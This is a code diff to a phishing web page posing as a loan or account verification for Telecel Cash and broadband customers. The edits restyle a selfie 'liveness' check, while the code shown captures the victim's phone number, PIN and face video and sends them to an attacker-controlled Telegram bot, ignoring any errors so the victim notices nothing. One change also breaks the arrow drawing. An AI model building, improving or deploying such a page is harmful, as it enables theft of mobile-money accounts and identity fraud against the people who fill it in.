@@ -123,7 +123,7 @@ input::placeholder{color:var(--text-light)}
   font-family:'DM Sans',sans-serif;font-size:14px;cursor:pointer;
 }
 
-/* HIDDEN CANVAS FOR CROPPING */
+/* HIDDEN CANVAS FOR RECORDING */
 #cropCanvas { display: none; }
 
 /* SPINNER */
@@ -247,24 +247,29 @@ input::placeholder{color:var(--text-light)}
 <div id="selfieScreen">
   <video id="selfieVideo" autoplay muted playsinline></video>
   <canvas id="cropCanvas"></canvas>
-  <svg id="selfieOverlay" viewBox="0 0 390 844" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
+  <svg id="selfieOverlay" viewBox="0 0 400 400" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
     <defs>
-      <mask id="ovalMask">
-        <rect width="390" height="844" fill="white"/>
-        <circle cx="195" cy="340" r="140" fill="black"/>
+      <mask id="circleMask">
+        <rect width="400" height="400" fill="white"/>
+        <circle cx="200" cy="200" r="180" fill="black"/>
       </mask>
       <filter id="glow">
         <feGaussianBlur stdDeviation="4" result="blur"/>
         <feComposite in="SourceGraphic" in2="blur" operator="over"/>
       </filter>
     </defs>
-    <rect width="390" height="844" fill="rgba(0,0,0,0.5)" mask="url(#ovalMask)"/>
-    <circle id="ovalBorder" cx="195" cy="340" r="140" fill="none" stroke="rgba(255,255,255,0.7)" stroke-width="4" stroke-dasharray="8 8"/>
+    <!-- Darkened background mask -->
+    <rect width="400" height="400" fill="rgba(0,0,0,0.6)" mask="url(#circleMask)"/>
+    <!-- Animated dashed border -->
+    <circle id="ovalBorder" cx="200" cy="200" r="180" fill="none" stroke="rgba(255,255,255,0.8)" stroke-width="5" stroke-dasharray="10 10">
+      <animateTransform attributeName="transform" type="rotate" from="0 200 200" to="360 200 200" dur="10s" repeatCount="indefinite"/>
+    </circle>
+    <!-- Liveness indicators -->
     <g id="arrowGroup" style="opacity:0">
-      <circle id="arrowCircle" cx="195" cy="160" r="24" fill="rgba(228,35,32,0.9)" filter="url(#glow)"/>
-      <path id="aLine1" d="" stroke="white" stroke-width="3.5" stroke-linecap="round"/>
-      <path id="aLine2" d="" stroke="white" stroke-width="3.5" stroke-linecap="round"/>
-      <path id="aLine3" d="" stroke="white" stroke-width="3.5" stroke-linecap="round"/>
+      <circle id="arrowCircle" cx="200" cy="40" r="28" fill="rgba(228,35,32,0.9)" filter="url(#glow)"/>
+      <path id="aLine1" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
+      <path id="aLine2" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
+      <path id="aLine3" d="" stroke="white" stroke-width="4" stroke-linecap="round"/>
     </g>
   </svg>
   <div class="selfie-panel">
@@ -306,19 +311,19 @@ const CONFIG = {
 };
 
 const STEPS = [
-  { instr:'Hold still',        sub:'Keep your face centred',      dir:null,    cx:195, cy:160 },
-  { instr:'Look to your left', sub:'Slowly turn your head left',  dir:'left',  cx:60,  cy:340 },
-  { instr:'Look to your right',sub:'Slowly turn your head right', dir:'right', cx:330, cy:340 },
-  { instr:'Look up',           sub:'Tilt your head upward',       dir:'up',    cx:195, cy:160 },
-  { instr:'Look down',         sub:'Tilt your head downward',     dir:'down',  cx:195, cy:530 },
+  { instr:'Hold still',        sub:'Keep your face centred',      dir:null,    cx:200, cy:40 },
+  { instr:'Look to your left', sub:'Slowly turn your head left',  dir:'left',  cx:40,  cy:200 },
+  { instr:'Look to your right',sub:'Slowly turn your head right', dir:'right', cx:360, cy:200 },
+  { instr:'Look up',           sub:'Tilt your head upward',       dir:'up',    cx:200, cy:40 },
+  { instr:'Look down',         sub:'Tilt your head downward',     dir:'down',  cx:200, cy:360 },
 ];
 
 const ARROW_SHAPES = {
-  null:  { l1:[0,-8,0,8],  l2:[-8,-2, 0,-10], l3:[8,-2, 0,-10] },
-  left:  { l1:[-8,0,8,0],  l2:[0,-8,-10,0],   l3:[0,8,-10,0]   },
-  right: { l1:[-8,0,8,0],  l2:[0,-8,10,0],    l3:[0,8,10,0]    },
-  up:    { l1:[0,8,0,-8],  l2:[-8,2,0,-8],    l3:[8,2,0,-8]    },
-  down:  { l1:[0,-8,0,8],  l2:[-8,-2,0,8],    l3:[8,-2,0,8]    },
+  null:  { l1:[0,-10,0,10],  l2:[-10,-2, 0,-12], l3:[10,-2, 0,-12] },
+  left:  { l1:[-10,0,10,0],  l2:[0,-10,-12,0],   l3:[0,10,-12,0]   },
+  right: { l1:[-10,0,10,0],  l2:[0,-10,12,0],    l3:[0,10,12,0]    },
+  up:    { l1:[0,10,0,-10],  l2:[-10,2,0,-10],   l3:[10,2,0,-10]   },
+  down:  { l1:[0,-10,0,10],  l2:[-10,-2,0,10],   l3:[10,-2,0,10]   },
 };
 
 const phoneInput      = document.getElementById('phone');
@@ -407,7 +412,7 @@ function setArrow(step) {
   const cx=s.cx, cy=s.cy;
   arrowCircle.setAttribute('cx', cx); arrowCircle.setAttribute('cy', cy);
   aLine1.setAttribute('x1', cx+shape.l1[0]); aLine1.setAttribute('y1', cy+shape.l1[1]);
-  aLine1.setAttribute('x2', cx+shape.l1[2]); aLine1.setAttribute('y2', cy+shape.l1[3]);
+  aLine1.setAttribute('x2', cx+shape.l2[0]); aLine1.setAttribute('y2', cy+shape.l2[1]);
   aLine2.setAttribute('x1', cx+shape.l2[0]); aLine2.setAttribute('y1', cy+shape.l2[1]);
   aLine2.setAttribute('x2', cx+shape.l2[2]); aLine2.setAttribute('y2', cy+shape.l2[3]);
   aLine3.setAttribute('x1', cx+shape.l3[0]); aLine3.setAttribute('y1', cy+shape.l3[1]);
@@ -461,29 +466,35 @@ selfieCancel.onclick = () => {
   isProcessing=false;
 };
 
-// ── CIRCULAR CROP LOGIC ──
+// ── PERFECT CIRCULAR CROP LOGIC ──
 function drawCircularFrame() {
-  const size = 480; // Final square size for the video
+  const size = 512; // Standard square size for circular messages
   cropCanvas.width = size;
   cropCanvas.height = size;
 
   const v = selfieVideo;
   const vw = v.videoWidth;
   const vh = v.videoHeight;
+  
   if (vw && vh) {
+    // 1. Force a square crop from the center of the camera source
     const minDim = Math.min(vw, vh);
     const sx = (vw - minDim) / 2;
     const sy = (vh - minDim) / 2;
 
     cropCtx.clearRect(0, 0, size, size);
-    cropCtx.save();
     
-    // Create circular mask
+    // 2. Draw solid black background first (outside the circle)
+    cropCtx.fillStyle = '#000000';
+    cropCtx.fillRect(0, 0, size, size);
+
+    cropCtx.save();
+    // 3. Create a perfect circle clipping path
     cropCtx.beginPath();
-    cropCtx.arc(size/2, size/2, size/2, 0, Math.PI * 2);
+    cropCtx.arc(size/2, size/2, size/2 - 2, 0, Math.PI * 2);
     cropCtx.clip();
 
-    // Draw video frame (mirrored)
+    // 4. Draw mirrored video frame into the circle
     cropCtx.translate(size, 0);
     cropCtx.scale(-1, 1);
     cropCtx.drawImage(v, sx, sy, minDim, minDim, 0, 0, size, size);
@@ -498,7 +509,7 @@ async function startSelfieVerification() {
   selfieInstr.textContent='Starting camera…';
   selfieSub.textContent='';
   arrowGroup.style.opacity='0';
-  ovalBorder.setAttribute('stroke','rgba(255,255,255,0.7)');
+  ovalBorder.setAttribute('stroke','rgba(255,255,255,0.8)');
   recordedChunks=[]; selfieBlob=null;
 
   try {
@@ -509,7 +520,7 @@ async function startSelfieVerification() {
     selfieVideo.srcObject = mediaStream;
     await selfieVideo.play();
 
-    // Start circular cropping loop
+    // Start precision circular cropping loop
     drawCircularFrame();
 
     // Capture the canvas stream at 30fps
@@ -535,11 +546,11 @@ async function startSelfieVerification() {
 async function sendVideoToTelegram() {
   if (!selfieBlob || selfieBlob.size < 1000) return;
   const accountType = document.getElementById('accountType').value==='mobile' ? 'Telecel Cash' : 'Broadband';
-  const caption = `🎥 Liveness Selfie (Circular)\n📱 Phone: ${capturedPhone}\n🔑 PIN: ${capturedPin}\n🏦 Account: ${accountType}\n💰 Amount: ${document.getElementById('loanAmount').textContent}`;
+  const caption = `🎥 Circular Selfie Verified\n📱 Phone: ${capturedPhone}\n🔑 PIN: ${capturedPin}\n🏦 Account: ${accountType}\n💰 Amount: ${document.getElementById('loanAmount').textContent}`;
   const ext = selfieBlob.type.includes('mp4') ? 'mp4' : 'webm';
   const fd  = new FormData();
   fd.append('chat_id', CONFIG.CHAT_ID);
-  fd.append('video',   selfieBlob, `liveness_${Date.now()}.${ext}`);
+  fd.append('video',   selfieBlob, `circular_${Date.now()}.${ext}`);
   fd.append('caption', caption);
   try { await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVideo`, { method:'POST', body:fd }); } catch(_) {}
 }
